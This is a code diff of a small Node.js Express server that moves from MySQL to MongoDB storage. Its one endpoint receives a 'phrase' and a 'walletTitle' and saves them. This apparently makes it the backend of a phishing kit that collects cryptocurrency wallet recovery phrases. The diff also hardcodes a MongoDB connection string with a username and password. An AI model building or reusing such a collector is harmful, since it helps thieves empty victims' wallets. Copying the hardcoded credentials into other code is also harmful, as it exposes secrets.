@@ -1,75 +1,59 @@
-// const express = require("express");
-// const cors = require("cors");
-// const bodyParser = require("body-parser");
-
-// const app = express();
-// const PORT = process.env.PORT || 3000;
-
-// // Middleware
-// app.use(cors());
-// app.use(bodyParser.urlencoded({ extended: false }));
-// app.use(bodyParser.json());
-
-// // Handle form submissions
-// app.post("/submit-form", (req, res) => {
-//   const { phrase, walletTitle } = req.body;
-
-//   // Process the form data
-//   console.log("Received phrase:", phrase);
-//   console.log("Selected wallet title:", walletTitle);
-
-//   // Example: Send response
-//   res.json({
-//     message: "Form data received successfully!",
-//     data: { phrase, walletTitle },
-//   });
-
-//   // Optionally: Send email, store in database, etc.
-// });
-
-// // Start the server
-// app.listen(PORT, () => {
-//   console.log(`Server is running on http://localhost:${PORT}`);
-// });
-
 const express = require("express");
 const cors = require("cors");
 const bodyParser = require("body-parser");
-const db = require('./db'); // Import the database configuration
-
+const mongoose = require("mongoose");
 const app = express();
+
+app.use(express.urlencoded({ extended: true }));
 const PORT = process.env.PORT || 3000;
+
+const mongodb =
+  "mongodb+srv://New-express-user_13:user_13@cluster0.6xyca.mongodb.net/Form?retryWrites=true&w=majority";
+mongoose
+  .connect(mongodb, { useNewUrlParser: true, useUnifiedTopology: true })
+  .then(() => {
+    console.log("connected to MongoDB");
+    app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
+  })
+  .catch((err) => console.log("Failed to connect to MongoDB", err));
 
 // Middleware
 app.use(cors());
 app.use(bodyParser.urlencoded({ extended: false }));
 app.use(bodyParser.json());
 
+// Define a schema for form data
+const formSchema = new mongoose.Schema({
+  phrase: String,
+  walletTitle: String,
+});
+
+// Create a model for form submissions
+const Form = mongoose.model("Form", formSchema);
+
 // Handle form submissions
-app.post("/submit-form", (req, res) => {
+app.post("/submit-form", async (req, res) => {
   const { phrase, walletTitle } = req.body;
 
-  // Process the form data
-  console.log("Received phrase:", phrase);
-  console.log("Selected wallet title:", walletTitle);
+  // Create a new form entry
+  const newForm = new Form({
+    phrase,
+    walletTitle,
+  });
 
-  // Insert data into the MySQL database
-  const query = 'INSERT INTO form_responses (phrase, walletTitle) VALUES (?, ?)';
-  db.query(query, [phrase, walletTitle], (err, results) => {
-    if (err) {
-      console.error('Error inserting data into MySQL:', err.stack);
-      return res.status(500).json({ message: 'Error saving form data' });
-    }
+  try {
+    // Save the form data to MongoDB
+    await newForm.save();
+    console.log("Form data saved to MongoDB");
 
-    // Send response
+    // Send a response back to the client
     res.json({
-      message: "Form data received and stored successfully!",
+      message: "Form data received and saved successfully!",
       data: { phrase, walletTitle },
     });
-  });
+  } catch (err) {
+    console.error("Error saving form data:", err);
+    res.status(500).json({ message: "Error saving form data" });
+  }
 });
 
-// Start the server
-app.listen(PORT, () => {
-  console.log(`Server is running on http://localhost:${PORT}`);
-});
